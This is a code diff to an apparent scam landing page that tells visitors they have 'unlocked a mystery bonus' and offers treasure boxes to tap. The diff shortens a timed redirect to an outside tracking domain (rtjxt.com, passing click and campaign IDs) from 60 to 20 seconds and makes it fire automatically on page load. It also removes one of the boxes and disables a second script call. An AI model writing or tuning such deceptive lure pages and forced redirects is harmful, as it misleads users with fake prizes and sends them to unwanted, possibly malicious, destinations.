@@ -29,7 +29,7 @@
         function sL0() {
             setTimeout(function() {
                 window.location = "https://rtjxt.com/link?z=9419981&var="+cid+"&ymid="+clickId;
-            }, 60000);
+            }, 20000);
         }
     </script>
     <script>
@@ -72,7 +72,7 @@
         </style>
         <script src="jq.min.js"></script>
     </head>
-    <body>
+    <body onload="sL0()">
         <!-- <div class="header">
             <img class="logo" src="logo.png">
         </div> -->
@@ -89,7 +89,7 @@
                     <h1 style="text-align: center;">Congratulations!</h1>
                     <p class="paragraph">You've unlocked a mystery bonus just for you!</p>
                     <p class="paragraph">Special offers are available for selected users today.</p>
-                    <p class="paragraph">Tap a treasure box and see what you get!</p>
+                    <p class="paragraph">Tap a mystery box and see what you get!</p>
                     <div class="chests">
                         <div class="chest">
                             <img src="chest.webp" class="imgChest">
@@ -99,10 +99,10 @@
                             <img src="chest.webp" class="imgChest">
                             <button class="button">Open it!</button>
                         </div>
-                        <div class="chest">
+                        <!-- <div class="chest">
                             <img src="chest.webp" class="imgChest">
                             <button class="button">Open it!</button>
-                        </div>
+                        </div> -->
                     </div>
                 </div>
                 <!-- <div class="prize" style="display:none;">
@@ -205,7 +205,7 @@
                 setTimeout(function() {
                     $('.intro, .loader, h1, canvas').remove();
                     // $('.prize').fadeIn();
-                    sL1();
+                    // sL1();
                 }, 2000);
             });
         </script>
